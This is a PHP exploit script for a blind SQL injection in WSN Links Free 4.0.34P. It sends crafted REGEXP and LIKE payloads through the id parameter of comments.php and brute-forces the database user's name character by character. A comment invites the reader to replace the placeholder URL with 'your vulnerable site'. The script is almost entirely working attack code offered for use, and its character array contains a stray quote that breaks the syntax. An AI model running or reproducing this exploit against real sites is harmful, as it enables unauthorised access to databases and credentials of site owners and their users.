<?php
function stringtohex($string){
 $hex = '';
 for($i=0 ; $i<strlen($string) ; $i++) $hex .= base_convert(ord(substr($string, $i, 1)), 10, 16);
 return '0x'.$hex;
}
echo "=================================================\n";
echo "   WSN Links Free 4.0.34P Blind SQL Injection    \n";
echo "             by Stack & bugtr4cker               \n";
echo "        usage:      php $argv[0]               \n";
echo "=================================================\n";
echo "\n[!] UserID : ";
$id = intval(fgets(STDIN));
$url = "http://www.example.com/wlinks/comments.php?id=$id"; # change http://www.example.com/wlinks/ by your vulnerable site
$regexp = 'Your Name:';
$login_len = 0;
$password_len = 0;
$login = '';
$password = '';
$alphabet_Stack =  array("a" , "b" , "c" , "d" , "e" , "f" , "g" , "h" , "i" , "j" , "k" , "l" , "m" , "n" , "o" , "p" , "q" , "r" , "s" , "t" , "u" , "v" , "w" , "x" , "y" , "z" , "0" , "1" , "2" , "3" , "4" , "5" , "6" , "7" , "8" , "9", "@", ":", "<", ">" ,'0','1','2','3','4','5','6','7','8','9','a','b','c','d','e','f','.','*','%','é'&' );
echo "\n[+] BF Longeur User : ";
$stop = false ;
while($stop == false){
 $lenregexp = stringtohex('^.{'.$login_len.'}$');
 $xurl = $url."+AND+(SELECT+user())+REGEXP+$lenregexp/**" ;
 $rep = file_get_contents($xurl);
 if(preg_match("#$regexp#",$rep)){
  echo $login_len ;
  $stop = true ;
 }
 if($stop == false) $login_len++ ;
}
echo "\n[+] BF du User : ";
for($i=0; $i<= $login_len; $i++){
 $ok = false ; 
 foreach($alphabet_Stack as $Stackl){
  if($ok == true) continue ;
  $like = stringtohex($login.$Stackl);
  $urlx = $url."+AND+(SELECT+user())+LIKE+concat($like,0x25)/*";
  $rep = file_get_contents($urlx) ;
 
  if(preg_match("#$regexp#",$rep)){
   echo $Stackl ;
   $login .= $Stackl ;
   $ok = true ;
  }
 }
}
echo "\n\n[+] Injection Completed \n";
echo "\t User : $login\n\t";
?>
